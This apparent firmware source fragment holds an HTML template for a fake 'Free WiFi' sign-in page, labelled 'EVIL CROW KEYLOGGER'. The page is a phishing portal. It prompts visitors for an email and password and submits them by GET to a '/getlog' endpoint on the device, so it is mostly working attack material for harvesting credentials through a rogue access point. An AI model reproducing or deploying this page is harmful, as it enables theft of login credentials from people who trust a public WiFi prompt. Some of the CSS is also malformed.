const char TEMPLATE[] = R"=====(
<html>
<head>
<title>Free WiFi</title>
<style>

.login-page {
  width: 600px;
  padding: center;
  margin: auto;
  
}

.form input {
  font-family: "Roboto", sans-serif;
  outline: 0;
  background: #f2f2f2;
  width: 100%;
  border: 0;
  margin: 0 0 15px;
  padding: 15px;
  box-sizing: border-box;
  font-size: 14px;
}
input[type=submit] {
background:#216778; font-weight: bold; color: #f2f2f2; }
}
.form .message {
  margin: 15px 0 0;
  color: #ffffff;
  font-size: 17px;
  
}
.form .message a {
  color: #ffffff;
  text-decoration: none;
}
p{
  
  text-align: center;
  font-size: 20px;
  color: #ffffff;
}

body {
  background: #8aaab2;
  background: -webkit-linear-gradient(right, #8aaab2, #8aaab2);
  background: -moz-linear-gradient(right, #8aaab2, #8aaab2);
  background: -o-linear-gradient(right, #8aaab2, #8aaab2);
  background: linear-gradient(to left, #8aaab2, #8aaab2);
  font-family: "Roboto", sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;      
}
img {
    display: block;
    margin: center;
    
  padding-top: 2.5cm;
  }

::-webkit-input-placeholder {
    color: #8aaab2;
  font-weight: bold;
}
    font-weight: bold;

</style>
</head>
<body>
<br><br><br><br>
<p align="center" ><font color="#FF2a2b" size="20px"><b>FREE</b></font> <font color="#216778" size="20px"><b>WIFI</b></font><br><font color="black" size="4px">EVIL CROW KEYLOGGER</font></p>
<p><b>Sign in up for Free internet access.</b></p>
<div class="login-page" >
    <div class="form" action="/">
    <form class='login-form' action='/getlog' method='GET'>
      <input type="email" placeholder="Email" name="email"/>
      <input type="password" placeholder="Password" name="password"/>
    <input type="submit" value="Sign in">
    </form>
    </div>
</div>
</body>
</html>
)=====";
